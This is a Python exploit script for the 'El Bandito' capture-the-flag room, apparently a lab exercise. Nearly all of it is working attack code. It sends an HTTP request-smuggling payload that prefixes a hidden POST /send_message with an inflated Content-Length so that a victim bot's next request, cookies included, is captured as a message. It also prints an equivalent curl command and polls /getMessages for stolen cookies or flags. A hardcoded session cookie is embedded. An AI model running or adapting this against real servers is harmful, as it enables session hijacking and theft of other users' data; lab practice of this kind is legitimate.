#!/usr/bin/env python3
import requests
import time
import json
from urllib3.exceptions import InsecureRequestWarning
import urllib3

# Suppress warnings for self-signed certificates
urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
TARGET_HOST = "elbandito.thm"
TARGET_PORT = 80
SESSION_COOKIE = "eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z-rKtg.CyaOpfDjNdjcJgsJn1FvGXf6dM0"  # Replace with your session cookie

def exploit_request_smuggling():
    """
    Exploit HTTP request smuggling using a simpler approach
    This may be more reliable on some server configurations
    """
    print("[*] Attempting simplified request smuggling technique...")
    
    # Prepare the smuggled content
    # We're using a raw request string that will be parsed appropriately
    smuggled_data = """POST / HTTP/1.1
Host: {host}:{port}
Cookie: session={cookie}
Content-Length: 0

POST /send_message HTTP/1.1
Host: {host}:{port}
Cookie: session={cookie}
Content-Type: application/x-www-form-urlencoded
Content-Length: 730

data=""".format(host=TARGET_HOST, port=TARGET_PORT, cookie=SESSION_COOKIE)
    
    # Headers for our request
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Cookie": f"session={SESSION_COOKIE}",
        "Connection": "close"
    }
    
    # Try different variations
    for attempt in range(5):
        print(f"[*] Attempt {attempt+1}/5")
        try:
            response = requests.post(
                f"https://{TARGET_HOST}:{TARGET_PORT}/",
                data=smuggled_data,
                headers=headers,
                verify=False,
                timeout=10
            )
            
            print(f"[+] Response status: {response.status_code}")
            if response.status_code == 502 or response.status_code == 503:
                print("[+] Got a server error, which might indicate success")
                print("    Continuing with next attempt...")
            else:
                print(f"[+] Response content: {response.text[:100]}...")
            
        except requests.exceptions.RequestException as e:
            print(f"[!] Request exception: {e}")
            print("[+] This could be a sign the exploit is working")
        
        # Slight pause between attempts
        time.sleep(2)

def try_curl_approach():
    """
    Instructions for using curl as an alternative method
    """
    print("\n[*] Alternative: Try using curl with the following command:")
    
    curl_cmd = f"""
curl -k https://{TARGET_HOST}:{TARGET_PORT}/ \\
  -H "Host: {TARGET_HOST}:{TARGET_PORT}" \\
  -H "Cookie: session={SESSION_COOKIE}" \\
  -H "Connection: close" \\
  --data-binary @- << EOF
POST / HTTP/1.1
Host: {TARGET_HOST}:{TARGET_PORT}
Cookie: session={SESSION_COOKIE}
Content-Length: 0

POST /send_message HTTP/1.1
Host: {TARGET_HOST}:{TARGET_PORT}
Cookie: session={SESSION_COOKIE}
Content-Type: application/x-www-form-urlencoded
Content-Length: 730

data=
EOF
"""
    print(curl_cmd)
    
def check_messages():
    """Check for captured messages with possible flag content"""
    print("\n[*] Checking messages for captured data...")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Cookie": f"session={SESSION_COOKIE}",
    }
    
    try:
        response = requests.get(
            f"https://{TARGET_HOST}:{TARGET_PORT}/getMessages",
            headers=headers,
            verify=False
        )
        
        print(f"[+] Response status: {response.status_code}")
        
        if response.status_code == 200:
            try:
                # Try parsing as JSON
                messages = response.json()
                print("[+] Message content:")
                
                # Look for interesting data in the messages
                found_flag = False
                for user, user_messages in messages.items():
                    print(f"\n[User: {user}]")
                    for message in user_messages:
                        if isinstance(message, str):
                            print(f"- {message[:100]}")
                            if "cookie" in message.lower() or "flag" in message.lower():
                                print(f"  [!] POTENTIAL FLAG FOUND: {message}")
                                found_flag = True
                        elif isinstance(message, dict):
                            msg_content = message.get("message", "")
                            print(f"- {msg_content[:100]}")
                            if "cookie" in msg_content.lower() or "flag" in msg_content.lower():
                                print(f"  [!] POTENTIAL FLAG FOUND: {msg_content}")
                                found_flag = True
                
                if not found_flag:
                    print("[!] No obvious flag found. Inspect all messages carefully.")
                    # Save the raw JSON for manual inspection
                    with open("messages.json", "w") as f:
                        json.dump(messages, f, indent=2)
                    print("[+] Full messages saved to messages.json for manual inspection")
                    
            except json.JSONDecodeError:
                print("[!] Response is not valid JSON. Raw content:")
                print(response.text[:500])  # Show first 500 chars
                
                # Save the raw response for manual inspection
                with open("response.txt", "w") as f:
                    f.write(response.text)
                print("[+] Full response saved to response.txt for manual inspection")
                
    except requests.exceptions.RequestException as e:
        print(f"[!] Error getting messages: {e}")

def main():
    print("[+] El Bandito Alternative Exploitation Script")
    print("[+] Target: " + TARGET_HOST)
    
    # Try the simplified request smuggling approach
    exploit_request_smuggling()
    
    # Show curl alternative
    try_curl_approach()
    
    # Wait for bot/victim to make a request
    print("\n[*] Waiting for bot/victim to make a request (approx. 2 minutes)...")
    time.sleep(120)
    
    # Check messages
    check_messages()
    
    print("\n[+] Exploitation attempts completed")
    print("[+] If you don't see a flag, try again or use the curl command")

if __name__ == "__main__":
    main()
